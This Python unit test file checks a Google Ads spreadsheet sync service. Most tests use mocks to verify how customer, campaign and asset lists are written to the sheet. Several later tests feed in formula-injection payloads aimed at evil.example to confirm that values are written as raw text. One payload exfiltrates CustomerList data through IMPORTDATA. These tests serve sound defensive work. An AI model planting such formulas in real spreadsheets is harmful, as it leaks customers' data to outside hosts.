# Copyright 2024 Google LLC

# Licensed under the Apache License, Version 2.0 (the "License")
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at

# https: // www.apache.org / licenses / LICENSE - 2.0

# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.
"""Tests for Sheet Service."""

from collections import namedtuple
import types
import unittest
from unittest import mock
import data_references
from sheet_api import SheetsService

_FAKE_CONFIG_YAML = (
    'spreadsheet_id: "fake-spreadsheet-id"\n'
    'customer_id_inclusion_list: ""\n'
    'login_customer_id: "1234567890"\n'
)


class TestSheetService(unittest.TestCase):

  def setUp(self):
    super().setUp()
    self.credentials = mock.Mock()
    self._google_ads_client = mock.Mock()
    self.google_ads_service = mock.MagicMock()
    with (
        mock.patch(
            "builtins.open", mock.mock_open(read_data=_FAKE_CONFIG_YAML)
        ),
        mock.patch("sheet_api.discovery.build") as mock_build,
    ):
      self.mock_spreadsheets = mock_build.return_value.spreadsheets.return_value
      self.sheet_service = SheetsService(
          self.credentials, self._google_ads_client, self.google_ads_service
      )

  @mock.patch("sheet_api.SheetsService.update_asset_sheet_output")
  @mock.patch("sheet_api.SheetsService.update_sheet_lists")
  def test_refresh_assets_list(
      self, mock_update_sheet_lists, mock_update_asset_sheet_output
  ):
    Customer = namedtuple("Customer", ["id"])
    ResultRow = namedtuple("ResultRow", ["customer_client"])
    retrieve_all_customers = [
        ResultRow(customer_client=Customer(id="customer1")),
        ResultRow(customer_client=Customer(id="customer2")),
    ]
    mock_update_asset_sheet_output.return_value = None

    self.google_ads_service.retrieve_all_customers.return_value = (
        retrieve_all_customers
    )
    mock_update_sheet_lists.return_value = {
        "customer1": {"Campaign1", "Campaign2"},
        "customer2": {"Test Campaign1"},
    }

    self.sheet_service.refresh_assets_list()
    self.google_ads_service.retrieve_all_assets.assert_has_calls(
        [mock.call("customer1"), mock.call("customer2")]
    )

  @mock.patch("sheet_api.SheetsService.update_asset_sheet_output")
  @mock.patch("sheet_api.SheetsService.update_sheet_lists")
  def test_update_asset_sheet_output(
      self, mock_update_sheet_lists, mock_update_asset_sheet_output
  ):
    Customer = namedtuple("Customer", ["id"])
    ResultRow = namedtuple("ResultRow", ["customer_client"])
    retrieve_all_customers = [
        ResultRow(customer_client=Customer(id="customer1")),
        ResultRow(customer_client=Customer(id="customer2")),
    ]

    AssetGroupAsset = namedtuple("AssetGroupAsset", ["resource_name"])
    AssetGroupRow = namedtuple("AssetGroupRow", ["asset_group_asset"])

    refresh_results = [
        AssetGroupRow(
            asset_group_asset=AssetGroupAsset(resource_name="resource_name1")
        ),
        AssetGroupRow(
            asset_group_asset=AssetGroupAsset(resource_name="resource_name2")
        ),
    ]
    self.google_ads_service.retrieve_all_customers.return_value = (
        retrieve_all_customers
    )
    account_map = {
        "customer1": {"Campaign1", "Campaign2"},
        "customer2": {"Test Campaign1"},
    }
    mock_update_sheet_lists.return_value = account_map
    self.google_ads_service.retrieve_all_assets.return_value = refresh_results

    self.sheet_service.refresh_assets_list()

    mock_update_asset_sheet_output.assert_has_calls([
        mock.call(refresh_results, account_map),
        mock.call(refresh_results, account_map),
    ])

  @mock.patch("sheet_api.SheetsService.update_sitelink_sheet_output")
  @mock.patch("sheet_api.SheetsService.update_asset_sheet_output")
  @mock.patch("sheet_api.SheetsService._set_cell_value")
  @mock.patch("sheet_api.SheetsService.update_sheet_lists")
  def test_update_asset_sheet_output_with_empty_campaign_for_first_customer(
      self,
      mock_update_sheet_lists,
      mock_set_cell_value,
      mock_update_asset_sheet_output,
      mock_update_sitelink_sheet_output,
  ):
    Customer = namedtuple("Customer", ["id"])
    ResultRow = namedtuple("ResultRow", ["customer_client"])
    retrieve_all_customers = [
        ResultRow(customer_client=Customer(id="customer1")),
        ResultRow(customer_client=Customer(id="customer2")),
    ]

    self.google_ads_service.retrieve_all_customers.return_value = (
        retrieve_all_customers
    )
    account_map = {
        "customer1": {},
        "customer2": {"Test Campaign1"},
    }
    mock_update_sheet_lists.return_value = account_map
    self.google_ads_service.retrieve_all_campaigns.side_effect = [
        {},
        {"Test Campaign1"},
    ]
    self.google_ads_service.retrieve_all_asset_groups.return_value = {}
    self.sheet_service.refresh_spreadsheet()

    mock_update_sheet_lists.assert_has_calls([
        mock.call(
            retrieve_all_customers,
            data_references.SheetNames.customers,
            "!B:B",
            {},
        ),
        mock.call(
            {"Test Campaign1"},
            data_references.SheetNames.campaigns,
            "!D:D",
            account_map,
        ),
    ])

  @mock.patch("sheet_api.SheetsService.update_sitelink_sheet_output")
  @mock.patch("sheet_api.SheetsService.update_asset_sheet_output")
  @mock.patch("sheet_api.SheetsService._set_cell_value")
  @mock.patch("sheet_api.SheetsService.update_sheet_lists")
  def test_update_asset_sheet_output_with_empty_asset_group_for_first_customer(
      self,
      mock_update_sheet_lists,
      mock_set_cell_value,
      mock_update_asset_sheet_output,
      mock_update_sitelink_sheet_output,
  ):
    Customer = namedtuple("Customer", ["id"])
    ResultRow = namedtuple("ResultRow", ["customer_client"])
    retrieve_all_customers = [
        ResultRow(customer_client=Customer(id="customer1")),
        ResultRow(customer_client=Customer(id="customer2")),
    ]

    self.google_ads_service.retrieve_all_customers.return_value = (
        retrieve_all_customers
    )
    account_map = {
        "customer1": {"Campaign1"},
        "customer2": {"Test Campaign1"},
    }
    mock_update_sheet_lists.return_value = account_map
    self.google_ads_service.retrieve_all_campaigns.side_effect = [
        {"Campaign1"},
        {"Test Campaign1"},
    ]
    self.google_ads_service.retrieve_all_asset_groups.side_effect = [
        {},
        {"AssertGroup1"},
    ]

    self.sheet_service.refresh_spreadsheet()

    mock_update_sheet_lists.assert_has_calls([
        mock.call(
            retrieve_all_customers,
            data_references.SheetNames.customers,
            "!B:B",
            {},
        ),
        mock.call(
            {"Campaign1"},
            data_references.SheetNames.campaigns,
            "!D:D",
            account_map,
        ),
        mock.call(
            {"Test Campaign1"},
            data_references.SheetNames.campaigns,
            "!D:D",
            account_map,
        ),
        mock.call(
            {"AssertGroup1"},
            data_references.SheetNames.asset_groups,
            "!F:F",
            account_map,
        ),
    ])

  def test_add_new_asset_group_to_list_sheet_uses_raw_input_option(self):
    row = ["=Customer", "123", '=IMPORTDATA("https://evil.example")', "456", "+AG", "789"]
    self.sheet_service.add_new_asset_group_to_list_sheet(row)
    self.mock_spreadsheets.values.return_value.append.assert_called_once_with(
        spreadsheetId="fake-spreadsheet-id",
        range=f"{data_references.SheetNames.asset_groups}!{data_references.SheetRanges.asset_groups}",
        body={"majorDimension": "ROWS", "values": [row]},
        valueInputOption="RAW",
    )

  def test_add_new_campaign_to_list_sheet_uses_raw_input_option(self):
    row = ["AcmeCorp", "123", '=IMPORTDATA("https://evil.example")', "456"]
    self.sheet_service.add_new_campaign_to_list_sheet(row)
    self.mock_spreadsheets.values.return_value.append.assert_called_once_with(
        spreadsheetId="fake-spreadsheet-id",
        range="CampaignList!A:D",
        body={"majorDimension": "ROWS", "values": [row]},
        valueInputOption="RAW",
    )

  def test_update_asset_sheet_output_uses_raw_input_option(self):
    self.mock_spreadsheets.values.return_value.get.return_value.execute.return_value = {"values": []}
    self.mock_spreadsheets.values.return_value.append.return_value.execute.return_value = {"tableRange": "", "updates": {}}
    row = types.SimpleNamespace(
        asset_group_asset=types.SimpleNamespace(
            resource_name="customers/1/assetGroupAssets/2",
            field_type=types.SimpleNamespace(name=data_references.AssetTypes.headline),
        ),
        asset_group=types.SimpleNamespace(name="+AssetGroup"),
        customer=types.SimpleNamespace(descriptive_name="@Acme"),
        campaign=types.SimpleNamespace(name="=Campaign"),
        asset=types.SimpleNamespace(text_asset=types.SimpleNamespace(text='=IMPORTDATA("https://evil.example")')),
    )
    self.sheet_service.update_asset_sheet_output([row], {"@Acme": {"=Campaign": ["+AssetGroup"]}})
    _, kwargs = self.mock_spreadsheets.values.return_value.append.call_args
    self.assertEqual(kwargs["valueInputOption"], "RAW")

  def test_update_sitelink_sheet_output_uses_raw_input_option(self):
    self.mock_spreadsheets.values.return_value.get.return_value.execute.return_value = {"values": []}
    self.mock_spreadsheets.values.return_value.append.return_value.execute.return_value = {"tableRange": "", "updates": {}}
    row = types.SimpleNamespace(
        campaign_asset=types.SimpleNamespace(resource_name="customers/1/campaignAssets/2"),
        customer=types.SimpleNamespace(descriptive_name="Acme"),
        campaign=types.SimpleNamespace(name="Camp1"),
        asset=types.SimpleNamespace(
            final_urls=["https://example.com"],
            sitelink_asset=types.SimpleNamespace(
                link_text='=HYPERLINK("https://evil.example","Click")',
                description1="-desc1",
                description2="+desc2",
            ),
        ),
    )
    self.sheet_service.update_sitelink_sheet_output([row], {"Acme": {"Camp1": []}})
    _, kwargs = self.mock_spreadsheets.values.return_value.append.call_args
    self.assertEqual(kwargs["valueInputOption"], "RAW")

  def test_update_sheet_lists_uses_raw_input_option_for_formula_payloads(self):
    payload = '=IMPORTDATA("https://evil.example/exfil?"&JOIN(",",CustomerList!A:B))'
    row = types.SimpleNamespace(
        campaign=types.SimpleNamespace(name=payload, id=7777777777),
        customer=types.SimpleNamespace(descriptive_name="AcmeCorp", id=1234567890),
    )
    self.sheet_service.update_sheet_lists(
        results=[row],
        sheet_name=data_references.SheetNames.campaigns,
        column="!D:D",
        account_map={"AcmeCorp": {}},
        existing_values_set=set(),
    )
    _, kwargs = self.mock_spreadsheets.values.return_value.append.call_args
    self.assertEqual(kwargs["valueInputOption"], "RAW")
    self.assertEqual(kwargs["body"]["values"][0][data_references.CampaignList.campaign_name], payload)

  def test_set_cell_value_preserves_user_entered_for_trusted_formulas(self):
    formula = "=SORT(UNIQUE({CustomerList!$A$5:$A}))"
    self.sheet_service._set_cell_value(formula, "DropDownConfig!N3")
    self.mock_spreadsheets.values.return_value.update.assert_called_once_with(
        spreadsheetId="fake-spreadsheet-id",
        valueInputOption="USER_ENTERED",
        range="DropDownConfig!N3",
        body={"range": "DropDownConfig!N3", "values": [[formula]]},
    )

if __name__ == "__main__":
  unittest.main()
